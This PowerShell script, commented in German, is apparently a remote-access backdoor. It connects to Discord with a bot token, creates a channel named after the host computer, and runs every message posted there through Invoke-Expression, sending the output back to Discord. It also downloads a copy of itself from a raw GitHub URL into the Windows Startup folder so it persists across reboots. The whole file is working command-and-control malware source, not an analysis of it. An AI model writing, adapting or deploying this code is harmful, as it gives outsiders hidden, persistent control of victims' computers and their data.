param([string]$Token)

# Funktionen
function Start-RemoteBot {
    param([string]$Token)

    # Installieren falls nicht da
    if (-not (Get-Module -ListAvailable -Name DiscordPS)) {
        Install-Module DiscordPS -Force -Scope CurrentUser
    }

    Import-Module DiscordPS

    $ComputerName = $env:COMPUTERNAME
    $ChannelName = "Powershell"

    $Bot = Connect-DiscordBot -Token $Token
    Start-Sleep -Seconds 2

    # Kategorie erstellen
    $guild = Get-DiscordGuild | Select-Object -First 1
    $category = New-DiscordGuildChannel -GuildId $guild.Id -Name $ComputerName -Type Category
    Start-Sleep -Seconds 1

    # Channel innerhalb der Kategorie erstellen
    $chan = New-DiscordGuildChannel -GuildId $guild.Id -Name $ChannelName -ParentId $category.Id -Type Text

    # Kommando-Hörer starten
    Register-DiscordCommand -ChannelId $chan.Id -Command "*" -Action {
        param($Command, $Message)

        try {
            $output = Invoke-Expression $Command.Content 2>&1
            if ($output) {
                Send-DiscordMessage -ChannelId $chan.Id -Message "```\n$output\n```"
            } else {
                Send-DiscordMessage -ChannelId $chan.Id -Message "Done"
            }
        } catch {
            Send-DiscordMessage -ChannelId $chan.Id -Message "Error: $_"
        }
    }

    # Keep alive
    while ($true) { Start-Sleep -Seconds 60 }
}

# Autostart einrichten
$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\remote.ps1"
if (-not (Test-Path $scriptPath)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/floppydisk69-x/projectfloppy1/main/remote.ps1" -OutFile $scriptPath
}

# Starte Bot
Start-RemoteBot -Token $Token
